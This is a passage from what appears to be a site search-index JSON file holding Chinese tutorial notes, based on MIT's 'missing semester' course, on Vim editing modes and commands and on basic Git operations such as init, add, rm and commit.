\u4e0b\uff0c \u4e0a\uff0c \u53f3\uff09</li> <li>\u8bcd\uff1a\u00a0<code>w</code>\u00a0\uff08\u4e0b\u4e00\u4e2a\u8bcd\uff09\uff0c\u00a0<code>b</code>\u00a0\uff08\u8bcd\u521d\uff09\uff0c\u00a0<code>e</code>\u00a0\uff08\u8bcd\u5c3e\uff09</li> <li>\u884c\uff1a\u00a0<code>0</code>\u00a0\uff08\u884c\u521d\uff09\uff0c\u00a0<code>^</code>\u00a0\uff08\u7b2c\u4e00\u4e2a\u975e\u7a7a\u683c\u5b57\u7b26\uff09\uff0c\u00a0<code>$</code>\u00a0\uff08\u884c\u5c3e\uff09</li> <li>\u5c4f\u5e55\uff1a\u00a0<code>H</code>\u00a0\uff08\u5c4f\u5e55\u9996\u884c\uff09\uff0c\u00a0<code>M</code>\u00a0\uff08\u5c4f\u5e55\u4e2d\u95f4\uff09\uff0c\u00a0<code>L</code>\u00a0\uff08\u5c4f\u5e55\u5e95\u90e8\uff09</li> <li>\u7ffb\u9875\uff1a\u00a0<code>Ctrl-u</code>\u00a0\uff08\u4e0a\u7ffb\uff09\uff0c\u00a0<code>Ctrl-d</code>\u00a0\uff08\u4e0b\u7ffb\uff09</li> <li>\u6587\u4ef6\uff1a\u00a0<code>gg</code>\u00a0\uff08\u6587\u4ef6\u5934\uff09\uff0c\u00a0<code>G</code>\u00a0\uff08\u6587\u4ef6\u5c3e\uff09</li> <li>\u884c\u6570\uff1a\u00a0<code>:{\u884c\u6570}&lt;CR&gt;</code>\u00a0\u6216\u8005\u00a0<code>{\u884c\u6570}G</code>\u00a0({\u884c\u6570}\u4e3a\u884c\u6570)</li> <li>\u6742\u9879\uff1a\u00a0<code>%</code>\u00a0\uff08\u627e\u5230\u914d\u5bf9\uff0c\u6bd4\u5982\u62ec\u53f7\u6216\u8005 / / \u4e4b\u7c7b\u7684\u6ce8\u91ca\u5bf9\uff09</li> <li>\u67e5\u627e\uff1a\u00a0<code>f{\u5b57\u7b26}</code>\uff0c\u00a0<code>t{\u5b57\u7b26}</code>\uff0c\u00a0<code>F{\u5b57\u7b26}</code>\uff0c\u00a0<code>T{\u5b57\u7b26}</code><ul> <li>\u67e5\u627e/\u5230 \u5411\u524d/\u5411\u540e \u5728\u672c\u884c\u7684{\u5b57\u7b26}</li> <li><code>,</code>\u00a0/\u00a0<code>;</code>\u00a0\u7528\u4e8e\u5bfc\u822a\u5339\u914d</li> </ul> </li> <li>\u641c\u7d22:\u00a0<code>/{\u6b63\u5219\u8868\u8fbe\u5f0f}</code>,\u00a0<code>n</code>\u00a0/\u00a0<code>N</code>\u00a0\u7528\u4e8e\u5bfc\u822a\u5339\u914d</li> </ul> <p>Vim\u5f3a\u5927\u7684\u7f16\u8f91\u80fd\u529b\u6765\u81ea\u4e8e\u5176\u666e\u901a\u6a21\u5f0f\u547d\u4ee4\u3002\u666e\u901a\u6a21\u5f0f\u547d\u4ee4\u5f80\u5f80\u9700\u8981\u4e00\u4e2a\u64cd\u4f5c\u7b26\u7ed3\u5c3e\u3002\u4f8b\u5982\u666e\u901a\u6a21\u5f0f\u547d\u4ee4\"dd\"\u5220\u9664\u5f53\u524d\u884c\uff0c\u4f46\u662f\u7b2c\u4e00\u4e2a\"d\"\u7684\u540e\u9762\u53ef\u4ee5\u8ddf\u53e6\u5916\u7684\u79fb\u52a8\u547d\u4ee4\u6765\u4ee3\u66ff\u7b2c\u4e8c\u4e2a\"d\"\uff0c\u6bd4\u5982\u7528\u79fb\u52a8\u5230\u4e0b\u4e00\u884c\u7684\"j\"\u952e\u5c31\u53ef\u4ee5\u5220\u9664\u5f53\u524d\u884c\u548c\u4e0b\u4e00\u884c\u3002\u53e6\u5916\u8fd8\u53ef\u4ee5\u6307\u5b9a\u547d\u4ee4\u91cd\u590d\u6b21\u6570\uff0c\"2dd\"\uff08\u91cd\u590d\"dd\"\u4e24\u6b21\uff09\uff0c\u548c\"dj\"\u7684\u6548\u679c\u662f\u4e00\u6837\u7684\u3002\u7528\u6237\u5b66\u4e60\u4e86\u5404\u79cd\u5404\u6837\u7684\u6587\u672c\u95f4\u79fb\u52a8\uff0f\u8df3\u8f6c\u7684\u547d\u4ee4\u548c\u5176\u4ed6\u7684\u666e\u901a\u6a21\u5f0f\u7684\u7f16\u8f91\u547d\u4ee4\uff0c\u5e76\u4e14\u80fd\u591f\u7075\u6d3b\u7ec4\u5408\u4f7f\u7528\u7684\u8bdd\uff0c\u80fd\u591f\u6bd4\u90a3\u4e9b\u6ca1\u6709\u6a21\u5f0f\u7684\u7f16\u8f91\u5668\u66f4\u52a0\u9ad8\u6548\u7684\u8fdb\u884c\u6587\u672c\u7f16\u8f91\u3002</p> <p>\u5728\u666e\u901a\u6a21\u5f0f\u4e2d\uff0c\u6709\u5f88\u591a\u65b9\u6cd5\u53ef\u4ee5\u8fdb\u5165\u63d2\u5165\u6a21\u5f0f\u3002\u6bd4\u8f83\u666e\u901a\u7684\u65b9\u5f0f\u662f\u6309\"a\"\uff08append\uff0f\u8ffd\u52a0\uff09\u952e\u6216\u8005\"i\"\uff08insert\uff0f\u63d2\u5165\uff09\u952e\u3002</p>","tags":["MIT","note"]},{"location":"tutorial/MIT/2_learn-to-use-Vim-editor/#v12","title":"V.1.2 \u63d2\u5165\u6a21\u5f0f","text":"<p>\u5728\u666e\u901a\u6a21\u5f0f\u4e2d\uff0c\u952e\u5165\u00a0<code>i</code>\u00a0\u8fdb\u5165\u63d2\u5165\u6a21\u5f0f\u3002</p> <p>\u8fd9\u65f6\u7684\u7f16\u8f91\u5668\u548c\u6211\u4eec\u5e73\u65f6\u4f7f\u7528\u7684\u57fa\u672c\u76f8\u540c\u3002\u4f46\u662f\u6240\u6709\u4f60\u9700\u8981\u7528\u9f20\u6807\u505a\u7684\u4e8b\uff0c\u4f60\u73b0\u5728\u90fd\u53ef\u4ee5\u7528\u952e\u76d8\uff1a\u91c7\u7528\u7f16\u8f91\u547d\u4ee4\u548c\u79fb\u52a8\u547d\u4ee4\u7684\u7ec4\u5408\u6765\u5b8c\u6210\u3002\u8fd9\u5c31\u662f Vim \u7684\u754c\u9762\u5f00\u59cb\u770b\u8d77\u6765\u50cf\u4e00\u4e2a\u7a0b\u5e8f\u8bed\u8a00\u7684\u65f6\u5019\u3002Vim \u7684\u7f16\u8f91\u547d\u4ee4\u4e5f\u88ab\u79f0\u4e3a \u201c\u52a8\u8bcd\u201d\uff0c\u56e0\u4e3a\u52a8\u8bcd\u53ef\u4ee5\u65bd\u52a8\u4e8e\u540d\u8bcd\u3002</p> <ul> <li><code>i</code>\u00a0\u8fdb\u5165\u63d2\u5165\u6a21\u5f0f<ul> <li>\u4f46\u662f\u5bf9\u4e8e\u64cd\u7eb5/\u7f16\u8f91\u6587\u672c\uff0c\u4e0d\u5355\u60f3\u7528\u9000\u683c\u952e\u5b8c\u6210</li> </ul> </li> <li><code>O</code>\u00a0/\u00a0<code>o</code>\u00a0\u5728\u4e4b\u4e0a/\u4e4b\u4e0b\u63d2\u5165\u884c</li> <li><code>d{\u79fb\u52a8\u547d\u4ee4}</code>\u00a0\u5220\u9664 {\u79fb\u52a8\u547d\u4ee4}<ul> <li>\u4f8b\u5982\uff0c<code>dw</code>\u00a0\u5220\u9664\u8bcd,\u00a0<code>d$</code>\u00a0\u5220\u9664\u5230\u884c\u5c3e,\u00a0<code>d0</code>\u00a0\u5220\u9664\u5230\u884c\u5934\u3002</li> </ul> </li> <li><code>c{\u79fb\u52a8\u547d\u4ee4}</code>\u00a0\u6539\u53d8 {\u79fb\u52a8\u547d\u4ee4}<ul> <li>\u4f8b\u5982\uff0c<code>cw</code>\u00a0\u6539\u53d8\u8bcd</li> <li>\u6bd4\u5982\u00a0<code>d{\u79fb\u52a8\u547d\u4ee4}</code>\u00a0\u518d\u00a0<code>i</code></li> </ul> </li> <li><code>x</code>\u00a0\u5220\u9664\u5b57\u7b26\uff08\u7b49\u540c\u4e8e\u00a0<code>dl</code>\uff09</li> <li><code>s</code>\u00a0\u66ff\u6362\u5b57\u7b26\uff08\u7b49\u540c\u4e8e\u00a0<code>xi</code>\uff09</li> <li>\u53ef\u89c6\u5316\u6a21\u5f0f + \u64cd\u4f5c<ul> <li>\u9009\u4e2d\u6587\u5b57,\u00a0<code>d</code>\u00a0\u5220\u9664 \u6216\u8005\u00a0<code>c</code>\u00a0\u6539\u53d8</li> </ul> </li> <li><code>u</code>\u00a0\u64a4\u9500,\u00a0<code>&lt;C-r&gt;</code>\u00a0\u91cd\u505a</li> <li><code>y</code>\u00a0\u590d\u5236 / \u201cyank\u201d \uff08\u5176\u4ed6\u4e00\u4e9b\u547d\u4ee4\u6bd4\u5982\u00a0<code>d</code>\u00a0\u4e5f\u4f1a\u590d\u5236\uff09</li> <li><code>p</code>\u00a0\u7c98\u8d34</li> <li>\u66f4\u591a\u503c\u5f97\u5b66\u4e60\u7684: \u6bd4\u5982\u00a0<code>~</code>\u00a0\u6539\u53d8\u5b57\u7b26\u7684\u5927\u5c0f\u5199</li> </ul> <p>\u5728\u8fd9\u4e2a\u6a21\u5f0f\u4e2d\uff0c\u5927\u591a\u6570\u6309\u952e\u90fd\u4f1a\u5411\u6587\u672c\u7f13\u51b2\u533a\u4e2d\u63d2\u5165\u6587\u672c\u3002\u5927\u591a\u6570\u65b0\u7528\u6237\u5e0c\u671b\u6587\u672c\u7f16\u8f91\u5668\u7f16\u8f91\u8fc7\u7a0b\u4e2d\u4e00\u76f4\u4fdd\u6301\u8fd9\u4e2a\u6a21\u5f0f\u3002</p> <p>\u5728\u63d2\u5165\u6a21\u5f0f\u4e2d\uff0c\u53ef\u4ee5\u6309ESC\u952e\u56de\u5230\u666e\u901a\u6a21\u5f0f\u3002</p>","tags":["MIT","note"]},{"location":"tutorial/MIT/2_learn-to-use-Vim-editor/#v13","title":"V.1.3 \u53ef\u89c6\u6a21\u5f0f","text":"<p>\u8fd9\u4e2a\u6a21\u5f0f\u4e0e\u666e\u901a\u6a21\u5f0f\u6bd4\u8f83\u76f8\u4f3c\u3002\u4f46\u662f\u79fb\u52a8\u547d\u4ee4\u4f1a\u6269\u5927\u9ad8\u4eae\u7684\u6587\u672c\u533a\u57df\u3002\u9ad8\u4eae\u533a\u57df\u53ef\u4ee5\u662f\u5b57\u7b26\u3001\u884c\u6216\u8005\u662f\u4e00\u5757\u6587\u672c\u3002\u5f53\u6267\u884c\u4e00\u4e2a\u975e\u79fb\u52a8\u547d\u4ee4\u65f6\uff0c\u547d\u4ee4\u4f1a\u88ab\u6267\u884c\u5230\u8fd9\u5757\u9ad8\u4eae\u7684\u533a\u57df\u4e0a\u3002Vim \u7684\"\u6587\u672c\u5bf9\u8c61\"\u4e5f\u80fd\u548c\u79fb\u52a8\u547d\u4ee4\u4e00\u6837\u7528\u5728\u8fd9\u4e2a\u6a21\u5f0f\u4e2d</p> <ul> <li>\u53ef\u89c6\u5316\uff1a<code>v</code></li> <li>\u53ef\u89c6\u5316\u884c\uff1a\u00a0<code>V</code></li> <li>\u53ef\u89c6\u5316\u5757\uff1a<code>Ctrl+v</code></li> </ul> <p>\u53ef\u4ee5\u7528\u79fb\u52a8\u547d\u4ee4\u6765\u9009\u4e2d</p>","tags":["MIT","note"]},{"location":"tutorial/MIT/2_learn-to-use-Vim-editor/#v14","title":"V.1.4 \u9009\u62e9\u6a21\u5f0f","text":"<p>\u8fd9\u4e2a\u6a21\u5f0f\u548c\u65e0\u6a21\u5f0f\u7f16\u8f91\u5668\u7684\u884c\u4e3a\u6bd4\u8f83\u76f8\u4f3c\uff08Windows\u6807\u51c6\u6587\u672c\u63a7\u4ef6\u7684\u65b9\u5f0f\uff09\u3002\u8fd9\u4e2a\u6a21\u5f0f\u4e2d\uff0c\u53ef\u4ee5\u7528\u9f20\u6807\u6216\u8005\u5149\u6807\u952e\u9ad8\u4eae\u9009\u62e9\u6587\u672c\uff0c\u4e0d\u8fc7\u8f93\u5165\u4efb\u4f55\u5b57\u7b26\u7684\u8bdd\uff0cVim\u4f1a\u7528\u8fd9\u4e2a\u5b57\u7b26\u66ff\u6362\u9009\u62e9\u7684\u9ad8\u4eae\u6587\u672c\u5757\uff0c\u5e76\u4e14\u81ea\u52a8\u8fdb\u5165\u63d2\u5165\u6a21\u5f0f\u3002</p>","tags":["MIT","note"]},{"location":"tutorial/MIT/2_learn-to-use-Vim-editor/#v15","title":"V.1.5 \u547d\u4ee4\u6a21\u5f0f","text":"<p>\u5728\u666e\u901a\u6a21\u5f0f\u4e0b\u952e\u5165\u00a0<code>:</code>\u00a0\u8fdb\u5165\u547d\u4ee4\u6a21\u5f0f\u3002 \u5728\u952e\u5165\u00a0<code>:</code>\u00a0\u540e\uff0c\u4f60\u7684\u5149\u6807\u4f1a\u7acb\u5373\u8df3\u5230\u5c4f\u5e55\u4e0b\u65b9\u7684\u547d\u4ee4\u884c\u3002 \u8fd9\u4e2a\u6a21\u5f0f\u6709\u5f88\u591a\u529f\u80fd\uff0c\u5305\u62ec\u6253\u5f00\uff0c\u4fdd\u5b58\uff0c\u5173\u95ed\u6587\u4ef6\uff0c\u4ee5\u53ca\u00a0\u9000\u51fa Vim\u3002</p> <ul> <li><code>:q</code>\u00a0\u9000\u51fa\uff08\u5173\u95ed\u7a97\u53e3\uff09</li> <li><code>:w</code>\u00a0\u4fdd\u5b58\uff08\u5199\uff09</li> <li><code>:wq</code>\u00a0\u4fdd\u5b58\u7136\u540e\u9000\u51fa</li> <li><code>:e {\u6587\u4ef6\u540d}</code>\u00a0\u6253\u5f00\u8981\u7f16\u8f91\u7684\u6587\u4ef6</li> <li><code>:ls</code>\u00a0\u663e\u793a\u6253\u5f00\u7684\u7f13\u5b58</li> <li><code>:help {\u6807\u9898}</code>\u00a0\u6253\u5f00\u5e2e\u52a9\u6587\u6863<ul> <li><code>:help :w</code>\u00a0\u6253\u5f00\u00a0<code>:w</code>\u00a0\u547d\u4ee4\u7684\u5e2e\u52a9\u6587\u6863</li> <li><code>:help w</code>\u00a0\u6253\u5f00\u00a0<code>w</code>\u00a0\u79fb\u52a8\u7684\u5e2e\u52a9\u6587\u6863</li> </ul> </li> </ul>","tags":["MIT","note"]},{"location":"tutorial/MIT/2_learn-to-use-Vim-editor/#v16-ex","title":"V.1.6 Ex\u6a21\u5f0f","text":"<p>\u8fd9\u548c\u547d\u4ee4\u6a21\u5f0f\u6bd4\u8f83\u76f8\u4f3c\uff0c\u5728\u4f7f\u7528\":visual\"\u547d\u4ee4\u79bb\u5f00Ex\u6a21\u5f0f\u524d\uff0c\u53ef\u4ee5\u4e00\u6b21\u6267\u884c\u591a\u6761\u547d\u4ee4</p>","tags":["MIT","note"]},{"location":"tutorial/MIT/2_learn-to-use-Vim-editor/#v17","title":"V.1.7 \u6269\u5c55","text":"","tags":["MIT","note"]},{"location":"tutorial/MIT/2_learn-to-use-Vim-editor/#v171","title":"V.1.7.1 \u8ba1\u6570","text":"<p>\u4f60\u53ef\u4ee5\u7528\u4e00\u4e2a\u8ba1\u6570\u6765\u7ed3\u5408\u201c\u540d\u8bcd\u201d\u548c\u201c\u52a8\u8bcd\u201d\uff0c\u8fd9\u4f1a\u6267\u884c\u6307\u5b9a\u64cd\u4f5c\u82e5\u5e72\u6b21\u3002</p> <ul> <li><code>3w</code>\u00a0\u5411\u540e\u79fb\u52a8\u4e09\u4e2a\u8bcd</li> <li><code>5j</code>\u00a0\u5411\u4e0b\u79fb\u52a85\u884c</li> <li><code>7dw</code>\u00a0\u5220\u96647\u4e2a\u8bcd</li> </ul>","tags":["MIT","note"]},{"location":"tutorial/MIT/2_learn-to-use-Vim-editor/#v172","title":"V.1.7.2 \u4fee\u9970\u8bed","text":"<p>\u4f60\u53ef\u4ee5\u7528\u4fee\u9970\u8bed\u6539\u53d8\u201c\u540d\u8bcd\u201d\u7684\u610f\u4e49\u3002\u4fee\u9970\u8bed\u6709\u00a0<code>i</code>\uff0c\u8868\u793a\u201c\u5185\u90e8\u201d\u6216\u8005\u201c\u5728\u5185\u201d\uff0c\u548c\u00a0<code>a</code>\uff0c \u8868\u793a\u201c\u5468\u56f4\u201d\u3002</p> <ul> <li><code>ci(</code>\u00a0\u6539\u53d8\u5f53\u524d\u62ec\u53f7\u5185\u7684\u5185\u5bb9</li> <li><code>ci[</code>\u00a0\u6539\u53d8\u5f53\u524d\u65b9\u62ec\u53f7\u5185\u7684\u5185\u5bb9</li> <li><code>da'</code>\u00a0\u5220\u9664\u4e00\u4e2a\u5355\u5f15\u53f7\u5b57\u7b26\u4e32\uff0c \u5305\u62ec\u5468\u56f4\u7684\u5355\u5f15\u53f7</li> </ul>","tags":["MIT","note"]},{"location":"tutorial/MIT/2_learn-to-use-Vim-editor/#v18","title":"V.1.8 \u6f14\u793a","text":"<p>missing-semester \u7ed9\u6211\u4eec\u4e3e\u4e86\u4e00\u4e2a\u5b9e\u4f8b\u5e76\u7ed9\u51fa\u4e86\u8be6\u7ec6\u7684\u6b65\u9aa4\uff0c\u8bf7\u8bfb\u8005\u81ea\u884c\u5b66\u4e60\uff0c\u8fd9\u4e00\u6bb5\u5efa\u8bae\u89c2\u770b Youtube \u89c6\u9891\uff0c\u89c6\u9891\u975e\u5e38\u53cb\u597d\u5730\u5728\u53f3\u4e0b\u89d2\u7ed9\u51fa\u4e86\u5f53\u65f6\u6309\u952e\u53ca\u5176\u987a\u5e8f\u3002</p>","tags":["MIT","note"]},{"location":"tutorial/MIT/2_learn-to-use-Vim-editor/#vi","title":"VI \u7f13\u5b58\uff0c \u6807\u7b7e\u9875\uff0c \u7a97\u53e3","text":"<p>Vim \u4f1a\u7ef4\u62a4\u4e00\u7cfb\u5217\u6253\u5f00\u7684\u6587\u4ef6\uff0c\u79f0\u4e3a\u201c\u7f13\u5b58\u201d\u3002\u4e00\u4e2a Vim \u4f1a\u8bdd\u5305\u542b\u4e00\u7cfb\u5217\u6807\u7b7e\u9875\uff0c\u6bcf\u4e2a\u6807\u7b7e\u9875\u5305\u542b \u4e00\u7cfb\u5217\u7a97\u53e3\uff08\u5206\u9694\u9762\u677f\uff09\u3002\u6bcf\u4e2a\u7a97\u53e3\u663e\u793a\u4e00\u4e2a\u7f13\u5b58\u3002\u8ddf\u7f51\u9875\u6d4f\u89c8\u5668\u7b49\u5176\u4ed6\u4f60\u719f\u6089\u7684\u7a0b\u5e8f\u4e0d\u4e00\u6837\u7684\u662f\uff0c \u7f13\u5b58\u548c\u7a97\u53e3\u4e0d\u662f\u4e00\u4e00\u5bf9\u5e94\u7684\u5173\u7cfb\uff1b\u7a97\u53e3\u53ea\u662f\u89c6\u89d2\u3002\u4e00\u4e2a\u7f13\u5b58\u53ef\u4ee5\u5728\u591a\u4e2a\u7a97\u53e3\u6253\u5f00\uff0c\u751a\u81f3\u5728\u540c\u4e00\u4e2a\u6807\u7b7e\u9875\u5185\u7684\u591a\u4e2a\u7a97\u53e3\u6253\u5f00\u3002\u8fd9\u4e2a\u529f\u80fd\u5176\u5b9e\u5f88\u597d\u7528\uff0c\u6bd4\u5982\u5728\u67e5\u770b\u540c\u4e00\u4e2a\u6587\u4ef6\u7684\u4e0d\u540c\u90e8\u5206\u7684\u65f6\u5019\u3002</p> <p>Vim \u9ed8\u8ba4\u6253\u5f00\u4e00\u4e2a\u6807\u7b7e\u9875\uff0c\u8fd9\u4e2a\u6807\u7b7e\u4e5f\u5305\u542b\u4e00\u4e2a\u7a97\u53e3\u3002</p>","tags":["MIT","note"]},{"location":"tutorial/MIT/2_learn-to-use-Vim-editor/#vii-neovim-vscode","title":"VII Neovim + vscode","text":"<p>\u53c2\u8003\u914d\u7f6e\uff1a</p> <ul> <li>\u4ece\u96f6\u5f00\u59cb\u914d\u7f6e Neovim(Nvim)</li> <li>VSCode Neovim</li> <li>\u7ed9\u7f16\u8f91\u5668\u4e4b\u795e\u914d\u4e0aGUI\uff08VSCode+Neovim\uff09</li> <li>neovim/doc/usr</li> </ul>","tags":["MIT","note"]},{"location":"tutorial/MIT/2_learn-to-use-Vim-editor/#viii","title":"VIII \u6269\u5c55\u8d44\u6599","text":"<ul> <li>vim \u4f7f\u7528\u6280\u5de7</li> <li>learn x in y minutes</li> <li><code>vimtutor</code>\u00a0\u662f\u4e00\u4e2a Vim \u5b89\u88c5\u65f6\u81ea\u5e26\u7684\u6559\u7a0b</li> <li>Vim Adventures\u00a0\u662f\u4e00\u4e2a\u5b66\u4e60\u4f7f\u7528 Vim \u7684\u6e38\u620f</li> <li>Vim Tips Wiki</li> <li>Vim Advent Calendar\u00a0\u6709\u5f88\u591a Vim \u5c0f\u6280\u5de7</li> <li>Vim Golf\u00a0\u662f\u7528 Vim \u7684\u7528\u6237\u754c\u9762\u4f5c\u4e3a\u7a0b\u5e8f\u8bed\u8a00\u7684\u00a0code golf</li> <li>Vi/Vim Stack Exchange</li> <li>Vim Screencasts</li> <li>Practical Vim\uff08\u4e66\u7c4d\uff09</li> </ul>","tags":["MIT","note"]},{"location":"tutorial/MIT/3_Git/","title":"3 Git","text":"Summary <p>Git \u662f\u4e00\u6b3e\u5206\u5e03\u5f0f\u7248\u672c\u63a7\u5236\u7cfb\u7edf\uff0c\u53ef\u4ee5\u8bb0\u5f55\u3001\u7ba1\u7406\u548c\u56de\u6eaf\u6587\u4ef6\u7684\u4fee\u6539\u5386\u53f2\u3002</p> <ul> <li>Git \u6a21\u578b\uff1a \u5de5\u4f5c\u533a\u3001\u6682\u5b58\u533a\u3001\u63d0\u4ea4\u5386\u53f2\u3001\u4ed3\u5e93\u3002</li> <li>\u57fa\u7840\u64cd\u4f5c\uff1a \u521d\u59cb\u5316\u4ed3\u5e93\u3001\u67e5\u770b\u72b6\u6001\u3001\u6dfb\u52a0\u4fee\u6539\u3001\u5220\u9664\u6587\u4ef6\u3001\u63d0\u4ea4\u4fee\u6539\u3001\u67e5\u770b\u5386\u53f2\u3001\u5207\u6362\u5206\u652f\u3001\u5408\u5e76\u5206\u652f\u3002</li> <li>\u8fdb\u9636\u64cd\u4f5c\uff1a \u4fee\u6539\u63d0\u4ea4\u5386\u53f2\u3001\u4f7f\u7528\u8fdc\u7a0b\u7248\u672c\u5e93\u3001\u5b50\u6a21\u5757\u3001Git \u7ed3\u6784\u3001\u9879\u76ee\u5408\u4f5c\u3002</li> </ul> <p>\u672c\u6587\u4e2d\uff0c\u975e wsl \u547d\u4ee4\u884c\u6f14\u793a\u622a\u56fe\u5747\u6765\u81ea \u300c\u5b9e\u7528\u6280\u80fd\u62fe\u9057\u300d\u3002</p> <p>Help</p> <p>\u5982\u679c\u51fa\u73b0\u4e86\u4e0b\u9762\u8fd9\u79cd\u754c\u9762\uff08\u5728 <code>git commit</code> \u65f6\uff09\u4e0d\u8981\u614c\uff0c\u770b\u770b nano\u3002 </p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#i-git","title":"I \u4ec0\u4e48\u662f Git\uff1f","text":"<p>Info</p> <p>\u5b98\u7f51\u5730\u5740\uff1ahttps://git-scm.com/</p> <p>\u5206\u5e03\u5f0f\u7248\u672c\u63a7\u5236\u7cfb\u7edf\uff08DVCS\uff0cDistributed Version Control System\uff09</p> <ul> <li> <p>\u5206\u5e03\u5f0f\uff1a\u4e0d\u9700\u8981\u8054\u7f51\uff0c\u5728\u81ea\u5df1\u7684\u673a\u5668\u4e0a\u5c31\u53ef\u4ee5\u4f7f\u7528</p> </li> <li> <p>\u7248\u672c\u63a7\u5236\uff1a\u8bb0\u5f55\u3001\u7ba1\u7406\u3001\u56de\u6eaf\u6587\u4ef6\u7684\u4fee\u6539\u5386\u53f2 </p> </li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#i1-git","title":"I.1 git \u6a21\u578b","text":"<p>\u4e0a\u56fe\u4e2d\uff0c\u6211\u4eec\u5e73\u65f6\u8fdb\u884c\u4fee\u6539\u7684\u90e8\u5206\u6b63\u662f\u5de5\u4f5c\u533a working directory \uff0c\u5728\u6211\u4eec\u5b8c\u6210\u4fee\u6539\u540e\uff0c\u6211\u4eec\u4e00\u822c\u4f7f\u7528 <code>git add --all</code> \u6765\u5c06\u6211\u4eec\u7684\u4fee\u6539\u79fb\u5165\u6682\u5b58\u533a stage \uff0c\u4e4b\u540e <code>git commit</code> \u63d0\u4ea4\u4e3a commit history \uff08\u8fd9\u4ee3\u8868\u7740\u4e00\u6b21\u53c8\u4e00\u6b21\u7684\u7248\u672c\uff0c\u4e5f\u5c31\u662f VCS \u7684\u542b\u4e49\u4e86\uff09\uff0c\u6700\u540e <code>git push</code> \u66f4\u65b0\u4ed3\u5e93\u3002</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#ii","title":"II \u57fa\u7840\u64cd\u4f5c","text":"","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#ii1-git-init","title":"II.1 git init","text":"<ul> <li>git init\uff1a\u8ba9\u5f53\u524d\u6587\u4ef6\u5939\u53d8\u6210\u00a0git\u00a0\u4ed3\u5e93\uff08\u521b\u5efa\u00a0.git\u00a0\u6587\u4ef6\u5939\uff09</li> <li>git init\u00a0folder\uff1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u6587\u4ef6\u5939\u5e76\u521d\u59cb\u5316\u4e3a\u00a0git\u00a0\u4ed3\u5e93</li> </ul> <p>\u51fa\u73b0 <code>.git</code> \u6587\u4ef6\u5939\u8868\u793a\u6210\u529f\u3002</p> <p></p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#ii2-git-staus","title":"II.2 git staus","text":"<p>\u67e5\u770b\u5de5\u4f5c\u533a&amp;\u6682\u5b58\u533a\u72b6\u6001\uff0c\u6211\u4eec\u5728\u4e0b\u9762\u4f1a\u5927\u91cf\u4f7f\u7528\u5230\u3002\u6587\u4ef6\u4e09\u4e2a\u7c7b\u522b\uff1a\u672a\u8ddf\u8e2a\uff08Untracked\uff0c\u65b0\u5efa\uff09\u3001\u5df2\u8ffd\u8e2a\uff08Tracked\uff0c\u7248\u672c\u5e93\u4e2d\u5df2\u7ecf\u5b58\u5728\uff09\u3001\u88ab\u5ffd\u7565\uff08Ignored\uff09\uff1b\u5bf9\u4e8e Ignored \u90e8\u5206\u53ef\u4ee5\u770b \u8fd9\u91cc\u3002</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#ii3-git-add","title":"II.3 git add","text":"<p>\u9996\u5148\u521b\u5efa\u4e00\u4e2a\u65b0\u6587\u4ef6\u7528\u4e8e\u6d4b\u8bd5\uff1a</p> <p>Help</p> <p>\u5982\u679c\u4e0d\u7406\u89e3\u5982\u4f55\u521b\u5efa\u53ef\u4ee5\u8f6c\u770b mkdir\uff1b\u6216\u8005 <code>man mkdir</code> \u67e5\u770b\u3002</p> <p></p> <p>\u53ef\u4ee5\u770b\u89c1 1.txt \u5df2\u7ecf\u653e\u5165\u4e86 stage \u4e2d\u3002</p> <p>Tip</p> <p>\u4e00\u4e2a\u4e2a\u52a0\u81ea\u7136\u662f\u5341\u5206\u9ebb\u70e6\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u7528 <code>git add .</code> \u5c06\u5f53\u524d\u8def\u5f84\u4e0b\u6587\u4ef6\u5168\u90e8\u52a0\u5165\uff0c <code>git add -a \u6216\u8005\u662f --all</code> \u5c31\u5c06\u6240\u6709\u4fee\u6539\u90fd\u5b58\u5165 stage \u4e2d\u3002\u719f\u6089\u4e00\u4e9b\u901a\u914d\u7b26\u80fd\u591f\u4e3a\u6211\u4eec\u7701\u53bb\u5f88\u591a\u91cd\u590d\u7684\u5de5\u4f5c\u3002</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#ii4-git-rm","title":"II.4 git rm","text":"<p>\u6211\u4eec\u90fd\u77e5\u9053 <code>rm</code> \u7528\u4e8e\u5220\u9664\u4e00\u4e2a\u672c\u5730\u6587\u4ef6\uff0c\u800c <code>git rm</code> \u5219\u53ef\u4ee5\u5220\u9664\u672c\u5730\u548c\u7248\u672c\u5e93\u4e2d\u7684\u6587\u4ef6\uff0c<code>git rm --cached</code> \u5219\u7528\u4e8e\u5220\u9664\u6682\u5b58\u533a\u4e2d\u7684\u6587\u4ef6</p> <p></p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#ii5-git-commit","title":"II.5 git commit","text":"<p>\u76f4\u63a5 <code>git commit</code> \u6211\u4eec\u4f1a\u53d1\u73b0\u8fdb\u5165\u4e86\u4e00\u4e2a\u7f16\u8f91\u5668\uff0c\u6bd4\u8f83\u9ebb\u70e6\uff0c\u6211\u4eec\u53ef\u4ee5\u9009\u62e9 <code>git commit -m \"message\"</code> \u6765\u8fdb\u884c\u63d0\u4ea4\uff0c\u5176\u4e2d message \u4e2d\u53ef\u4ee5\u4efb\u610f\u586b\u5199\uff0c\u4f46\u662f\u4e3a\u4e86\u4ee5\u540e\u770b\u89c1\u80fd\u77e5\u9053\u5e72\u4e86\u4ec0\u4e48\u8fd8\u662f\u7559\u6709\u4e00\u5b9a\u4fe1\u606f\u6bd4\u8f83\u597d\u3002</p> <p>Tip</p> <p>\u5173\u4e8e <code>git commit -m \"message\"</code> \u4e2d\u7684 message\uff0c\u4e3a\u4e86\u63d0\u9ad8\u5176\u8bb0\u5f55\u4fee\u6539\u7684\u80fd\u529b\uff0c\u6211\u4eec\u6700\u597d\u662f\u9075\u5faa\u4e00\u4e9b\u89c4\u8303(Angular)\uff1b\u5f53\u7136\uff0c\u5728 <code>\"\"</code> \u653e\u5165\u5f88\u591a\u4fe1\u606f\u592a\u4e0d\u96c5\u89c2\u4e86\uff0c\u6211\u4eec\u4e00\u822c\u9009\u62e9 <code>git commit</code> 